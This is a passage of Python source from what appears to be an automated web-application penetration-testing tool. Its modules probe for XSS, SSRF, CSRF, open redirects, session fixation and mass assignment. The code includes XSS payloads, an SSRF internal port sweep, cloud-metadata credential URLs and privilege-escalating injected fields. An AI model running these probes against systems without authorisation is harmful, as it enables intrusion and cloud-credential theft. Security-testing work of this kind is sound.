        m = _re.search(r'"(?:url|path|location|src|file|href)"\s*:\s*"([^"]+)"', blob)
        if m:
            stored = m.group(1)
        elif isinstance(j, dict) and j.get("id"):
            stored = path.rstrip("/") + "/" + str(j["id"])
    except Exception:
        stored = None
    rs, rctype = 0, ""
    if stored:
        su = stored if stored.startswith("http") else base.rstrip("/") + (stored if stored.startswith("/") else "/" + stored)
        try:
            rr = sess.get(su, timeout=20, verify=False); rs = rr.status_code; rctype = rr.headers.get("content-type", "")
        except Exception:
            pass
    from verified_findings import FileUploadOracle
    verdict, receipt = FileUploadOracle(r.status_code, rs, rctype, fn, surface=path).check()
    up = {"verdict": verdict, "stored": stored, **receipt}
    return {"status": 200, "body": _json.dumps(up)[:2000], "upload": up, "upload_verified": verdict == "verified"}


def xss(move, ctx):
    """DOM / reflected XSS via a HEADLESS browser (commercial-parity; the biggest 'not Burp-grade' gap).
    Injects marker payloads that set window.__aegis_xss=<token> IF they execute, loads the page in headless
    chromium (authenticated if session_for_role), and an XssOracle confirms on EXECUTION (not reflection).
    Reflected (query param) + DOM (hash fragment). GET navigation only -> non-destructive. Offline-safe: if
    Playwright/chromium is unavailable the leg skips gracefully."""
    import json as _json, uuid as _uuid
    try:
        from playwright.sync_api import sync_playwright
    except Exception as e:
        return {"status": -1, "body": f"[xss] playwright unavailable: {e}", "xss_verified": False,
                "xss": {"verdict": "rejected", "note": "headless browser (playwright) unavailable"}}
    base = (ctx or {}).get("base") or os.environ.get("AEGIS_TARGET") or "https://localhost:8443"
    sfr = (ctx or {}).get("session_for_role")
    surface = move.get("surface") or move.get("path") or "/"
    url0 = base.rstrip("/") + (surface if str(surface).startswith("/") else "/" + str(surface))
    params = move.get("params") or ["q", "search", "s", "query", "name", "message", "comment", "title",
                                    "redirect", "return", "ref", "id", "filter", "term"]
    tok = "TOK" + _uuid.uuid4().hex[:8]
    G = "window.__aegis_xss='" + tok + "'"
    # img-onerror FIRST: it's the reliable DOM-XSS on modern SPAs (innerHTML-injected <script> does NOT execute,
    # but an <img onerror> does) -- validated on juice-shop /#/search. Ordering the likely-winner first lets the
    # probe hit + break early, well inside the subprocess timeout.
    payloads = [f"<img src=x onerror={G}>", f"\"><img src=x onerror={G}>", f"<svg onload={G}>",
                f"<script>{G}</script>", f"\"><script>{G}</script>", f"';{G};//"]
    # auth cookies from the role session -> the headless context (so authed pages render)
    cookies = []
    try:
        if sfr:
            host = re.sub(r"^https?://", "", base).split("/")[0].split(":")[0]
            for c in sfr(move.get("role", "owner")).cookies:
                cookies.append({"name": c.name, "value": c.value, "domain": host, "path": "/"})
    except Exception:
        cookies = []
    # SUBPROCESS-ISOLATED probe (replaced the former dedicated-thread _browser_probe): the thread+sync_playwright
    # wrapper stalled on BOTH Windows (asyncio-loop deadlock) AND WSL (thread+sync) -> 'driver stall', 0 execution
    # witnessed even though the DOM-XSS fires (validated: img-onerror on /#/search executes, XssOracle verifies).
    # A FRESH PROCESS runs the probe on its MAIN thread (works everywhere); the hard subprocess timeout keeps the
    # cad34f0 guarantee -- a driver stall can NEVER wedge the hunt. Cap DECOUPLED from the per-move loop budget.
    import subprocess as _sp, sys as _sys
    _probe = os.path.join(os.path.dirname(os.path.abspath(__file__)), "xss_probe.py")
    _job = _json.dumps({"base": base, "surface": str(surface), "tok": tok,
                        "payloads": payloads, "params": list(params), "cookies": cookies})
    box = {"hit": None, "err": None}
    try:
        _r = _sp.run([_sys.executable, _probe], input=_job, capture_output=True, text=True,
                     timeout=int(os.environ.get("AEGIS_XSS_TIMEOUT", "30")))
        _lines = [ln for ln in (_r.stdout or "").strip().splitlines() if ln.strip().startswith("{")]
        _o = _json.loads(_lines[-1]) if _lines else {"hit": None, "err": (_r.stderr or "")[:120] or "no probe output"}
        box["hit"] = _o.get("hit"); box["err"] = _o.get("err")
    except _sp.TimeoutExpired:
        return {"status": -1, "body": "[xss] headless probe timed out (subprocess hard timeout)",
                "xss_verified": False, "xss": {"verdict": "rejected", "surface": surface,
                "note": "headless xss probe timed out -- subprocess killed, never wedged the hunt"}}
    except Exception as e:
        return {"status": -1, "body": f"[xss] subprocess error: {e}", "xss_verified": False,
                "xss": {"verdict": "rejected", "note": "xss subprocess run error"}}
    if box["err"] is not None:
        return {"status": -1, "body": f"[xss] browser error: {box['err']}", "xss_verified": False,
                "xss": {"verdict": "rejected", "note": "browser run error"}}
    hit = box["hit"]
    from verified_findings import XssOracle
    if hit:
        v, rc = XssOracle(tok, tok, surface=surface, param=hit["param"], context=hit["context"]).check()
        xr = {"verdict": v, **rc, "url": hit["url"]}
        return {"status": 200, "body": _json.dumps(xr)[:2000], "xss": xr, "xss_verified": True}
    return {"status": 200, "body": "[xss] no execution across %d params" % len(params),
            "xss": {"verdict": "rejected", "surface": surface, "params_tried": len(params)}, "xss_verified": False}


# Internal services a server-side fetch can reach via SSRF but an external scan cannot (loopback/firewalled):
# admin panels, DBs, caches, search, control panels. The SSRF becomes an INTERNAL PORT SCANNER.
_SSRF_INTERNAL_PORTS = [8090, 8080, 80, 8000, 443, 8443, 3306, 5432, 6379, 11211, 27017, 9200,
                        2082, 2083, 2086, 2087, 9000, 9090, 5601, 15672, 7080, 7443, 25, 5900]


def _ssrf_internal_sweep(sess, url, param, cap_ports=None):
    """DEVELOP a confirmed SSRF: use it to ENUMERATE the target's INTERNAL ports FIRST (the payoff is
    internal, not the external callback). For each 127.0.0.1:<port> inject it and compare the response
    (status / body size / latency) to a known-CLOSED baseline port; a response that DIFFERS from the closed
    baseline means something is listening internally -> a real escalation target (never ASSUME a port like
    8090, DISCOVER what actually answers). Non-destructive GETs. Returns {open_internal:[...], baseline}."""
    import time as _t2

    def _probe(target):
        t0 = _t2.time()
        try:
            r = sess.get(url, params={param: target}, timeout=8, verify=False, allow_redirects=False)
            return {"target": target, "status": r.status_code, "len": len(r.content or b""),
                    "ms": int((_t2.time() - t0) * 1000)}
        except Exception:
            return {"target": target, "status": -1, "len": 0, "ms": int((_t2.time() - t0) * 1000)}

    base_closed = _probe("http://127.0.0.1:1")                 # nothing listens on :1 -> the CLOSED signature
    def _differs(s):
        return (s["status"] != base_closed["status"]
                or abs(s["len"] - base_closed["len"]) > 24
                or (base_closed["ms"] and abs(s["ms"] - base_closed["ms"]) > max(400, base_closed["ms"])))

    ports = _SSRF_INTERNAL_PORTS[:int(cap_ports or os.environ.get("AEGIS_SSRF_PORT_CAP", 18))]
    found = []
    for host in ("127.0.0.1", "localhost", "0.0.0.0", "[::1]"):
        for port in ports:
            s = _probe(f"http://{host}:{port}/")
            if _differs(s):
                found.append({"host": host, "port": port, "status": s["status"], "len": s["len"], "ms": s["ms"]})
        if found:                                              # one loopback alias answering is enough
            break
    # also the cloud-metadata endpoints (internal too)
    for mt in ("http://169.254.169.254/latest/meta-data/", "http://metadata.google.internal/"):
        s = _probe(mt)
        if _differs(s):
            found.append({"host": mt, "port": "meta", "status": s["status"], "len": s["len"], "ms": s["ms"]})
    return {"open_internal": found, "baseline_closed": base_closed, "ports_scanned": len(ports)}


def ssrf(move, ctx):
    """SSRF probe via an in-sandbox CANARY: inject `http://<canary>/c/<token>` into SSRF-prone params and,
    if the token is called back, the target made an outbound request we controlled -> confirmed. GET query
    injection by default (non-destructive); POST body only if move.method=POST. Ground truth = the callback
    (SsrfOracle). Contained OOB (owned canary, not off-box egress)."""
    import json as _json, time as _t
    import requests as _rq
    try: _rq.packages.urllib3.disable_warnings()
    except Exception: pass
    try:
        import canary
        canary.start()
    except Exception as e:
        return {"status": -1, "body": f"[ssrf] canary unavailable: {e}", "ssrf_verified": False,
                "ssrf": {"verdict": "rejected", "note": "canary listener unavailable"}}
    base = (ctx or {}).get("base") or os.environ.get("AEGIS_TARGET") or "https://localhost:8443"
    sfr = (ctx or {}).get("session_for_role")
    sess = sfr(move.get("role", "owner")) if sfr else _rq.Session()
    try: sess.verify = False
    except Exception: pass
    surface = move.get("surface") or move.get("path") or "/"
    url = base.rstrip("/") + (surface if str(surface).startswith("/") else "/" + str(surface))
    params = move.get("params") or ["url", "uri", "redirect_uri", "callback", "webhook", "target", "dest",
                                    "destination", "image", "imageUrl", "image_url", "fetch", "feed", "proxy",
                                    "src", "link", "endpoint", "avatar", "document", "load", "u", "next", "host"]
    do_post = (move.get("method", "GET").upper() == "POST")
    tokmap = {}
    for p in params:
        tok = canary.token(); tokmap[tok] = p; cu = canary.url_for(tok)
        try:
            sess.get(url, params={p: cu}, timeout=12, verify=False, allow_redirects=False)
            if do_post:
                sess.post(url, json={p: cu}, timeout=12, verify=False, allow_redirects=False)
        except Exception:
            pass
    _t.sleep(float(move.get("wait", 4)))                  # allow async server-side fetch to call back
    from verified_findings import SsrfOracle
    for tok, p in tokmap.items():
        h = canary.hits(tok)
        if h:
            v, rc = SsrfOracle(h, surface=surface, param=p).check()
            sr = {"verdict": v, **rc}
            # DEVELOP the confirmed SSRF IMMEDIATELY: sweep the target's INTERNAL ports first (the real
            # payoff), so we DISCOVER what is actually listening internally instead of abandoning the
            # foothold or assuming a port. Gate AEGIS_SSRF_SWEEP=0.
            if str(os.environ.get("AEGIS_SSRF_SWEEP", "1")).lower() not in ("0", "false", "no", "off"):
                try:
                    sweep = _ssrf_internal_sweep(sess, url, p)
                    sr["internal_sweep"] = sweep
                    if sweep.get("open_internal"):
                        sr["note"] = (str(sr.get("note", "")) + " | SSRF-internal open: " +
                                      ",".join(f"{o['host']}:{o['port']}" for o in sweep["open_internal"][:8]))
                except Exception as _e:
                    sr["internal_sweep_error"] = repr(_e)[:120]
            return {"status": 200, "body": _json.dumps(sr)[:2000], "ssrf": sr, "ssrf_verified": True}
    # #3: SSRF-to-cloud-metadata arm -- inject internal/IMDS targets; a REFLECTED metadata read is confirmed
    # by the response SIGNATURE even without a callback (IMDS never calls back). Bounded; non-destructive GETs.
    imds_targets = move.get("imds_targets") or [
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/dynamic/instance-identity/document",
        "http://100.100.100.100/latest/meta-data/",                       # Alibaba
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"]
    imds_hdr = {"Metadata-Flavor": "Google", "Metadata": "true"}          # GCP/Azure IMDS gate headers
    for p in params[:int(move.get("imds_param_cap", 6))]:
        for tgt in imds_targets:
            try:
                r = sess.get(url, params={p: tgt}, timeout=12, verify=False, allow_redirects=False, headers=imds_hdr)
                v, rc = SsrfOracle(reflected_body=(r.text or "")[:4000], surface=surface, param=p).check()
                if v == "verified":
                    sr = {"verdict": v, "target": tgt, **rc}
                    return {"status": 200, "body": _json.dumps(sr)[:2000], "ssrf": sr, "ssrf_verified": True}
            except Exception:
                pass
    return {"status": 200, "body": "[ssrf] no OOB callback (%d params) and no IMDS reflection" % len(params),
            "ssrf": {"verdict": "rejected", "surface": surface, "params_tried": len(params),
                     "imds_tried": len(imds_targets), "canary": canary.base_url()}, "ssrf_verified": False}


def csrf(move, ctx):
    """CSRF POSTURE probe (non-destructive -- no forged state change): log in to capture the session cookie
    + a page body, and a CsrfOracle flags exposure only when there is NO SameSite protection AND no anti-CSRF
    token mechanism. Ground truth in result['csrf']."""
    import json as _json
    import requests as _rq
    try: _rq.packages.urllib3.disable_warnings()
    except Exception: pass
    base = (ctx or {}).get("base") or os.environ.get("AEGIS_TARGET") or "https://localhost:8443"
    s = _rq.Session(); s.verify = False
    set_cookies, body, hdrs = [], "", {}
    try:
        url = os.environ.get("AEGIS_LOGIN_URL") or (base.rstrip("/") + _discover_login(base))
        pin = os.environ.get("AEGIS_LOGIN_PIN") or os.environ.get("AEGIS_TEST_PIN") or "000000"
        idf = os.environ.get("AEGIS_LOGIN_ID_FIELD", "name"); pf = os.environ.get("AEGIS_LOGIN_PIN_FIELD", "pin")
        try:
            rmap = _json.loads(os.environ.get("AEGIS_ROLE_MAP", "{}")); ident = rmap.get("owner") or next(iter(rmap.values()), None)
        except Exception:
            ident = None
        def _grab(resp):
            if resp is None:
                return []
            if hasattr(resp, "raw") and hasattr(resp.raw, "headers"):
                cc = [v for k, v in resp.raw.headers.items() if k.lower() == "set-cookie"]
                if cc:
                    return cc
            return [resp.headers.get("set-cookie")] if resp.headers.get("set-cookie") else []
        if ident:
            lr = s.post(url, json={idf: ident, pf: pin}, timeout=20, verify=False)
            set_cookies = _grab(lr)
        gr = s.get(base.rstrip("/") + "/", timeout=20, verify=False)
        body = (gr.text or "")[:8000]; hdrs = dict(gr.headers)
        if not set_cookies:
            set_cookies = _grab(gr)
    except Exception:
        pass
    from verified_findings import CsrfOracle
    verdict, receipt = CsrfOracle(set_cookies, body, hdrs, surface=move.get("surface", "/")).check()
    cs = {"verdict": verdict, **receipt}
    return {"status": 200, "body": _json.dumps(cs)[:2000], "csrf": cs, "csrf_verified": verdict == "verified"}


def security_headers(move, ctx):
    """Cookie flags + security response headers (commercial-parity passive). Does a real login to capture a
    Set-Cookie (session-cookie flags) + a GET for response security headers, and a SecurityHeadersOracle
    flags missing HttpOnly/Secure/SameSite or absent CSP/HSTS/X-Content-Type-Options/X-Frame-Options.
    Reads only -- non-destructive. Ground truth in result['secheaders']."""
    import json as _json
    import requests as _rq
    try: _rq.packages.urllib3.disable_warnings()
    except Exception: pass
    base = (ctx or {}).get("base") or os.environ.get("AEGIS_TARGET") or "https://localhost:8443"
    over_https = str(base).lower().startswith("https")
    surface = move.get("surface") or "/"
    s = _rq.Session(); s.verify = False
    set_cookies, headers = [], {}
    # a real login to capture Set-Cookie (session-cookie flags)
    try:
        url = os.environ.get("AEGIS_LOGIN_URL") or (base.rstrip("/") + _discover_login(base))
        pin = os.environ.get("AEGIS_LOGIN_PIN") or os.environ.get("AEGIS_TEST_PIN") or "000000"
        idf = os.environ.get("AEGIS_LOGIN_ID_FIELD", "name"); pf = os.environ.get("AEGIS_LOGIN_PIN_FIELD", "pin")
        ident = None
        try:
            rmap = _json.loads(os.environ.get("AEGIS_ROLE_MAP", "{}")); ident = (rmap.get("owner") or next(iter(rmap.values()), None))
        except Exception:
            ident = None
        lr = s.post(url, json={idf: ident, pf: pin}, timeout=20, verify=False) if ident else None
        if lr is not None:
            set_cookies = [v for k, v in lr.raw.headers.items() if k.lower() == "set-cookie"] \
                if hasattr(lr, "raw") and hasattr(lr.raw, "headers") else \
                ([lr.headers.get("set-cookie")] if lr.headers.get("set-cookie") else [])
    except Exception:
        pass
    try:
        gr = s.get(base.rstrip("/") + (surface if str(surface).startswith("/") else "/"), timeout=20, verify=False)
        headers = dict(gr.headers)
        if not set_cookies and gr.headers.get("set-cookie"):
            set_cookies = [gr.headers.get("set-cookie")]
    except Exception:
        pass
    from verified_findings import SecurityHeadersOracle
    verdict, receipt = SecurityHeadersOracle(headers, set_cookies, over_https=over_https, surface=surface).check()
    sh = {"verdict": verdict, **receipt}
    return {"status": 200, "body": _json.dumps(sh)[:2000], "secheaders": sh, "secheaders_verified": verdict == "verified"}


def session_fixation(move, ctx):
    """SESSION FIXATION probe: capture a pre-auth session id, log in within the SAME jar, and check the id
    did NOT rotate yet the session is now authenticated. Reads only (a normal login) -> non-destructive.
    Ground truth in result['sessfix']."""
    import json as _json
    import requests as _rq
    try: _rq.packages.urllib3.disable_warnings()
    except Exception: pass
    base = (ctx or {}).get("base") or os.environ.get("AEGIS_TARGET") or "https://localhost:8443"
    cookie_name = move.get("cookie") or os.environ.get("AEGIS_SESSION_COOKIE", "connect.sid")
    probe = move.get("probe_step") or {"method": "GET", "path": "/api/settings/details"}
    s = _rq.Session(); s.verify = False
    try:
        s.get(base.rstrip("/") + "/", timeout=20, verify=False)          # obtain a pre-auth session
        pre = s.cookies.get(cookie_name)
        url = os.environ.get("AEGIS_LOGIN_URL") or (base.rstrip("/") + _discover_login(base))
        pin = os.environ.get("AEGIS_LOGIN_PIN") or os.environ.get("AEGIS_TEST_PIN") or "000000"
        idf = os.environ.get("AEGIS_LOGIN_ID_FIELD", "name"); pf = os.environ.get("AEGIS_LOGIN_PIN_FIELD", "pin")
        try:
            rmap = _json.loads(os.environ.get("AEGIS_ROLE_MAP", "{}")); ident = rmap.get("owner") or next(iter(rmap.values()), None)
        except Exception:
            ident = None
        if not ident:
            return {"status": 200, "body": "[sessfix] no login identity", "sessfix_verified": False,
                    "sessfix": {"verdict": "rejected", "note": "no login identity configured"}}
        s.post(url, json={idf: ident, pf: pin}, timeout=20, verify=False)
        post = s.cookies.get(cookie_name)
        pr = s.request(probe.get("method", "GET"), base.rstrip("/") + probe.get("path", "/"), timeout=20, verify=False)
        authed = 200 <= pr.status_code < 300
    except Exception as e:
        return {"status": -1, "body": f"[sessfix] {e}", "sessfix_verified": False,
                "sessfix": {"verdict": "rejected", "note": "probe error"}}
    from verified_findings import SessionFixationOracle
    verdict, receipt = SessionFixationOracle(pre, post, authed, surface="/api/auth/login", cookie=cookie_name).check()
    sfx = {"verdict": verdict, **receipt}
    return {"status": 200, "body": _json.dumps(sfx)[:2000], "sessfix": sfx, "sessfix_verified": verdict == "verified"}


def open_redirect(move, ctx):
    """OPEN REDIRECT probe: inject an external CANARY host into common redirect params and check whether the
    app redirects there (3xx Location or meta/JS body redirect). Reads only (GET, redirects NOT followed) ->
    non-destructive. Ground truth in result['openredir']."""
    import json as _json, re as _re
    import requests as _rq
    try: _rq.packages.urllib3.disable_warnings()
    except Exception: pass
    base = (ctx or {}).get("base") or os.environ.get("AEGIS_TARGET") or "https://localhost:8443"
    sfr = (ctx or {}).get("session_for_role")
    s = (sfr(move.get("role", "owner")) if sfr else _rq.Session());
    try: s.verify = False
    except Exception: pass
    target_host = _re.sub(r"^https?://", "", base).split("/")[0].split(":")[0]
    canary = move.get("canary") or "canary.aegis-oob.example"          # external, non-target host
    params = move.get("params") or ["url", "redirect", "redirect_uri", "next", "return", "returnUrl",
                                    "return_to", "dest", "destination", "continue", "callback", "r", "u"]
    surface = move.get("surface") or move.get("path") or "/"
    payloads = ["https://" + canary + "/x", "//" + canary + "/x"]      # absolute + scheme-relative
    for p in params:
        for pv in payloads:
            url = base.rstrip("/") + (surface if str(surface).startswith("/") else "/" + str(surface))
            try:
                r = s.get(url, params={p: pv}, timeout=15, verify=False, allow_redirects=False)
            except Exception:
                continue
            from verified_findings import OpenRedirectOracle
            v, rc = OpenRedirectOracle(r.status_code, r.headers.get("location"), (r.text or "")[:4000],
                                       canary, target_host=target_host, surface=surface, param=p).check()
            if v == "verified":
                orr = {"verdict": "verified", "param": p, "payload": pv, **rc}
                return {"status": 200, "body": _json.dumps(orr)[:2000], "openredir": orr, "openredir_verified": True}
    return {"status": 200, "body": "[open_redirect] no external redirect via " + str(len(params)) + " params",
            "openredir": {"verdict": "rejected", "surface": surface, "params_tried": len(params)},
            "openredir_verified": False}


def mass_assign(move, ctx):
    """MASS ASSIGNMENT probe: create an object WITH injected privileged fields (marker values) + a CONTROL
    create without them, and a MassAssignOracle confirms a privileged client-supplied field was accepted +
    persisted. PLANT-for-proof (creates records, never erases) -> non-destructive. Ground truth in
    result['massassign']."""
    import json as _json, uuid as _uuid
    import requests as _rq
    try: _rq.packages.urllib3.disable_warnings()
    except Exception: pass
    base = (ctx or {}).get("base") or os.environ.get("AEGIS_TARGET") or "https://localhost:8443"
    sfr = (ctx or {}).get("session_for_role")
    sess = sfr(move.get("role", "owner")) if sfr else (lambda s: (setattr(s, "verify", False) or s))(_rq.Session())
    create = move.get("create") or {}
    path = create.get("path") or move.get("surface")
    if not path:
        return {"status": 0, "body": "[mass_assign] no create path", "massassign_verified": False,
                "massassign": {"verdict": "rejected", "note": "no create spec"}}
    method = (create.get("method") or "POST").upper()
    if method not in ("POST", "PUT", "PATCH"):
        return {"status": 0, "blocked": "mass_assign needs a create/update verb", "body": ""}
    body = dict(create.get("body") or {})
    marker = "aegis-" + _uuid.uuid4().hex[:8]
    inject = dict(move.get("inject") or {"role": "OWNER", "isAdmin": True, "approved": True,
                                         "status": "CLEARED", "balance": 999999, "id": marker})
    # resolve a reference id if the create needs one (e.g. customerId from /api/customers)
    ref = move.get("ref")
    if ref and ref.get("list"):
        try:
            rl = sess.request("GET", base.rstrip("/") + ref["list"], timeout=20, verify=False).json()
            items = rl if isinstance(rl, list) else next((rl[k] for k in ("data", "items", "customers",
                    "jobs", "results") if isinstance(rl.get(k), list)), [])
            if items:
                body[ref.get("as", "id")] = items[0].get(ref.get("id_field", "id"))
        except Exception:
            pass
    url = base.rstrip("/") + path

    def _create(extra):
        try:
            r = sess.request(method, url, json={**body, **extra}, timeout=25, verify=False)
            try: j = r.json()
            except Exception: j = {}
            if isinstance(j, dict):
                for k in ("data", "item", "result", "payment", "invoice", "record"):
                    if isinstance(j.get(k), dict):
                        j = j[k]; break
            return r.status_code, (j if isinstance(j, dict) else {})
        except Exception:
            return -1, {}
    cs, control_obj = _create({})
    ins, created_obj = _create(inject)
    from verified_findings import MassAssignOracle
    verdict, receipt = MassAssignOracle(created_obj, inject, control_obj=control_obj, surface=path).check()
    ma = {"verdict": verdict, "surface": path, "create_status": ins, "control_status": cs, **receipt}
    return {"status": 200, "body": _json.dumps(ma)[:2000], "massassign": ma, "massassign_verified": verdict == "verified"}


# ---- G55: live legs for the breadth-closing oracles (G54). Non-destructive; SPA-shell guarded. ----
def _bo_sess(move, ctx):
    import requests as _rq
    try: _rq.packages.urllib3.disable_warnings()
    except Exception: pass
    base = (ctx or {}).get("base") or os.environ.get("AEGIS_TARGET") or "https://localhost:8443"
    sfr = (ctx or {}).get("session_for_role")
    sess = sfr(move.get("role", os.environ.get("AEGIS_NEUTRAL_ROLE", "technician"))) if sfr else _rq.Session()
    try: sess.verify = False
    except Exception: pass
    return base, sess


def _bo_spa(r):
    ct = (r.headers.get("content-type") or "").lower() if r is not None else ""
    t = (r.text or "")[:400].lower() if r is not None else ""
    from verified_findings import is_spa_shell   # H13: one canonical SPA-shell predicate
    return (r is None) or is_spa_shell(None, ct, t)


def _bo_get(sess, url):
    try:
        r = sess.request("GET", url, timeout=20, verify=False)
        try: j = r.json()
        except Exception: j = None
        return r, j
    except Exception:
        return None, None


def _bo_ids(j):
    items = j
    if isinstance(j, dict):
        for k in ("data", "items", "results", "rows", "invoices", "jobs", "customers", "creditNotes", "parts"):
            if isinstance(j.get(k), list):
                items = j[k]; break
        else:
            items = [j]
    if not isinstance(items, list):
        return []
    ids = [str(it.get("id")) for it in items if isinstance(it, dict) and it.get("id") is not None]
    return ids or ([f"n={len(items)}"] if items else [])   # fall back to a count token when rows have no id


def field_leak(move, ctx):
    """FIELD-LEAK: GET the surface as the low role; FieldLeakOracle flags denylisted sensitive fields / a
    role-diff. Read-only, SPA-guarded. Ground truth in result['field_leak']."""
    import json as _json
    base, sess = _bo_sess(move, ctx)
    path = move.get("surface") or move.get("path") or "/"
    r, j = _bo_get(sess, base.rstrip("/") + path)
    from verified_findings import FieldLeakOracle
    verdict, receipt = FieldLeakOracle(j if j is not None else (r.text if r else ""),
                                       role=move.get("role", ""), owner_extra_fields=move.get("owner_extra"),
                                       is_spa=_bo_spa(r), surface=path).check()
    fl = {"verdict": verdict, "surface": path, "http": (r.status_code if r else 0), **receipt}
    return {"status": (r.status_code if r else 0), "body": _json.dumps(fl)[:2000], "field_leak": fl,
            "field_leak_verified": verdict == "verified"}


def nested_write(move, ctx):
    """NESTED-WRITE over-post: as the low role, create with a nested relation pointing at a FOREIGN record
    (from ref.list), then read the created row back; NestedWriteOracle confirms the foreign relation persisted.
    PLANT-for-proof (create+read; never delete)."""
    import json as _json
    base, sess = _bo_sess(move, ctx)
    create = move.get("create") or {}
    path = create.get("path") or move.get("surface")
    method = (create.get("method") or "POST").upper()
    if not path or method not in ("POST", "PUT", "PATCH"):
        return {"status": 0, "body": "[nested_write] no create spec", "nested_write_verified": False,
                "nested_write": {"verdict": "rejected", "why": "no create spec"}}
    body = dict(create.get("body") or {})
    inject_field = move.get("inject_field")          # e.g. "customerId" (the relation FK to over-post)
    foreign = None
    ref = move.get("ref")
    if ref and ref.get("list"):
        _r, _j = _bo_get(sess, base.rstrip("/") + ref["list"])
        ids = _bo_ids(_j)
        foreign = next((i for i in ids if not i.startswith("n=")), None)
    inject = dict(move.get("inject") or ({inject_field: foreign} if (inject_field and foreign) else {}))
    if not inject:
        return {"status": 0, "body": "[nested_write] no foreign relation to inject", "nested_write_verified": False,
                "nested_write": {"verdict": "rejected", "why": "no foreign ref"}}
    url = base.rstrip("/") + path
    try:
        r = sess.request(method, url, json={**body, **inject}, timeout=25, verify=False)
        try: created = r.json()
        except Exception: created = {}
        if isinstance(created, dict):
            for k in ("data", "item", "result", "invoice", "record", "creditNote"):
                if isinstance(created.get(k), dict):
                    created = created[k]; break
    except Exception as e:
        return {"status": -1, "body": f"[nested_write] {e}", "nested_write_verified": False,
                "nested_write": {"verdict": "rejected", "why": "create failed"}}
    from verified_findings import NestedWriteOracle
    verdict, receipt = NestedWriteOracle(created if isinstance(created, dict) else {}, inject,
                                         role_permitted=bool(move.get("role_permitted")), surface=path).check()
    nw = {"verdict": verdict, "surface": path, "injected": inject, **receipt}
    return {"status": 200, "body": _json.dumps(nw)[:2000], "nested_write": nw,
            "nested_write_verified": verdict == "verified"}


def filter_injection(move, ctx):
    """FILTER-INJECTION: baseline list vs an injected filter that widens scope; FilterInjectionOracle needs
    the extra ids DB-confirmed cross-owner (move['cross_ids']) to VERIFY, else inconclusive. Read-only."""
    import json as _json
    base, sess = _bo_sess(move, ctx)
    path = move.get("surface") or move.get("path") or "/"
    _r0, j0 = _bo_get(sess, base.rstrip("/") + path)
    inj = move.get("inject_query") or "?take=1000&skip=0"
    _r1, j1 = _bo_get(sess, base.rstrip("/") + path + inj)
    base_ids, inj_ids = _bo_ids(j0), _bo_ids(j1)
    cross = move.get("cross_ids") or []              # DB-confirmed cross-owner ids (optional; else inconclusive)
    from verified_findings import FilterInjectionOracle
    verdict, receipt = FilterInjectionOracle(base_ids, inj_ids, cross, surface=path).check()
    fi = {"verdict": verdict, "surface": path, "baseline": len(base_ids), "injected": len(inj_ids), **receipt}
    return {"status": 200, "body": _json.dumps(fi)[:2000], "filter_injection": fi,
            "filter_injection_verified": verdict == "verified"}


def _looks_login(path):
    p = (path or "").lower()
    return any(s in p for s in ("login", "signin", "sign-in", "authenticate", "/session", "/auth"))


_LOGIN_SURFACE_CACHE = {}
def _discover_login(base, with_conf=False):
    """GAP-1 FIX: the real login endpoint varies by app (/rest/user/login, /api/auth/login, ...).
    Guessing it wrong sends every auth attack at a dead URL (juice-shop: /api/auth/login -> 500, real
    login is /rest/user/login). Probe common candidates once per base; pick the one that BEST BEHAVES like
    a login (rejects bad creds 400/401/403 = conf 3; 200/422/429 = conf 2) over one that 404/405/500s.
    Returns the path, or (path, confidence) when with_conf -- callers gate a surface rewrite on conf>=2 so
    a FAILED discovery never forces an attack at a non-auth endpoint (board-flagged regression). Generic/
    target-driven, cached. Override: AEGIS_LOGIN_URL (callers); AEGIS_LOGIN_CANDIDATES to tune the list."""
    base = (base or os.environ.get("AEGIS_TARGET") or "").rstrip("/")
    if not base:
        return ("/api/auth/login", 0) if with_conf else "/api/auth/login"
    if base in _LOGIN_SURFACE_CACHE:
        best, best_score = _LOGIN_SURFACE_CACHE[base]
        return (best, best_score) if with_conf else best
    cands = [c.strip() for c in os.environ.get("AEGIS_LOGIN_CANDIDATES", "").split(",") if c.strip()] or [
        # CMS login surfaces FIRST -- without these a WordPress/Joomla/Drupal target was mis-detected and
        # every auth attack went at a generic SPA path (chikov is WordPress: real login is /wp-login.php,
        # not /rest/user/login). wp-login.php answers a bad POST with 200+form (score 2) so it's picked.
        "/wp-login.php", "/xmlrpc.php", "/administrator/index.php", "/admin/login", "/wp-json/wp/v2/users",
        "/rest/user/login", "/api/auth/login", "/api/login", "/api/users/login", "/api/v1/auth/login",
        "/user/login", "/auth/login", "/login", "/api/sessions", "/session", "/api/account/login", "/signin"]
    emf = os.environ.get("AEGIS_USER_FIELD", "email"); pwf = os.environ.get("AEGIS_PW_FIELD", "password")
    best, best_score = "/api/auth/login", 0
    try:
        import requests as _rq
        try: _rq.packages.urllib3.disable_warnings()
        except Exception: pass
        for p in cands:
            try:
                r = _rq.post(base + p, json={emf: "probe_%d@example.invalid" % os.getpid(), pwf: "x"},
                             timeout=8, verify=False)
                sc = r.status_code
            except Exception:
                continue
            score = 3 if sc in (400, 401, 403) else 2 if sc in (200, 422, 429) else 0
            if score > best_score:
                best, best_score = p, score
            if score == 3:
                break
    except Exception:
        pass
    _LOGIN_SURFACE_CACHE[base] = (best, best_score)
    return (best, best_score) if with_conf else best


_AUTHBYPASS_HINTS = ("auth-bypass", "auth_bypass", "authbypass", "broken-authentication",
                     "broken_authentication", "broken-auth", "login-bypass", "login_bypass",
                     "sql-login", "sqli-login")
_SQLI_HINTS = ("sql injection", "sql-injection", "sql_injection", "sqli", "sqlraw", "sql_raw",
               "union select", "boolean-blind", "time-blind sql")
def _move_blob(move):
    return " ".join(str(move.get(k) or "") for k in
                    ("vuln_class", "angle", "technique", "mechanism", "why_novel", "intent")).lower()

_GENERIC_ACTIONS = ("web", "fact", "authz", "authz_fuzz", "", None)   # moves safe to RE-ROUTE
def _normalize_move(move, ctx):
    """GAP-2 FIX (board-hardened): route a move to the RIGHT specialized leg + the REAL login surface
    BEFORE dispatch. The board/planner reason in vuln CLASSES ('sql-injection','broken-authentication')
    but the loop dispatches by move['action'] (a LEGS key), and the class->action map collapses these to
    the generic `web` leg -- so the purpose-built `sql_raw` leg (SqlAuthBypassOracle) was never called.

    Board review (gpt-oss-120b/qwen) flagged two risks in the naive version, fixed here:
      * DO NOT hijack an EXPLICIT specialized leg (e.g. session_fixation) -> only re-route GENERIC moves,
        so multiple legs per class still run (the planner also seeds a dedicated sql_raw anchor).
